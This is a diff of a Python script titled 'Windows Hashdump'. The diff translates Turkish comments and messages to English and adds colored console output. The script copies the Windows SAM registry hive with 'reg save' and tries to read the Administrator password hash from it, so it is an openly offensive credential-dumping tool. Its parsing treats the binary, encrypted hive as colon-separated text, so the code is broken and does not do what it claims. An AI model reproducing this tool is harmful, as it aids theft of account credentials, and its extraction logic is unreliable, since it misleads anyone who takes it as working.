@@ -5,58 +5,62 @@ import sys
 import time
 import logging
 from win32com.shell import shell, shellcon
+from colorama import init, Fore
 
-# Loglama ayarları
+# Colorama initialization
+init(autoreset=True)
+
+# Log settings
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger()
 
 def get_admin_hash():
-    """Windows SAM veritabanından admin parolasının hash'ini alır."""
+    """Fetches the admin password hash from Windows SAM database."""
     try:
-        # SAM dosyasına erişim sağla
-        logger.info("SAM dosyasına erişiliyor...")
+        # Access SAM file
+        print(Fore.YELLOW + "[*] Accessing SAM file...")
         output = subprocess.check_output("reg save HKLM\\SAM C:\\sam_backup /y", shell=True)
         output = output.decode('utf-8')
 
-        # Yedekleme başarılı mı kontrol et
+        # Check if backup is successful
         if 'successfully' in output:
-            logger.info("[+] SAM veritabanı başarıyla yedeklendi.")
+            print(Fore.GREEN + "[+] SAM database successfully backed up.")
         else:
-            logger.error("[-] SAM veritabanına erişilemiyor.")
+            print(Fore.RED + "[-] Failed to access SAM database.")
             return None
 
-        # Dosyayı açıp hash'leri alalım
+        # Open the file and extract the hashes
         with open('C:\\sam_backup', 'r') as file:
             data = file.readlines()
 
         hashes = {}
         for line in data:
-            if "Administrator" in line:  # Kullanıcı ismini değiştirebilirsiniz
+            if "Administrator" in line:  # You can change the username here
                 parts = line.split(":")
-                hashes['Administrator'] = parts[1]  # Hash kısmını almak
+                hashes['Administrator'] = parts[1]  # Get the hash part
 
         if hashes:
             return hashes
         else:
-            logger.error("[-] Hashler bulunamadı.")
+            print(Fore.RED + "[-] No hashes found.")
             return None
 
     except Exception as e:
-        logger.error(f"[-] Hata: {e}")
+        print(Fore.RED + f"[-] Error: {e}")
         return None
 
 
 def display_hashes(hashes):
-    """Elde edilen hash'leri ekranda gösterir."""
+    """Displays the obtained hashes."""
     if hashes:
         for user, hash_value in hashes.items():
-            logger.info(f"[+] {user} Kullanıcısının Hash'i: {hash_value}")
+            print(Fore.GREEN + f"[+] Hash for {user} user: {hash_value}")
     else:
-        logger.error("[-] Hash bilgisi alınamadı.")
+        print(Fore.RED + "[-] Could not retrieve hash information.")
 
 
 def main():
-    logger.info("[*] Windows Hashdump Başlatıldı...")
+    print(Fore.CYAN + "[*] Starting Windows Hashdump...")
     hashes = get_admin_hash()
     display_hashes(hashes)
 
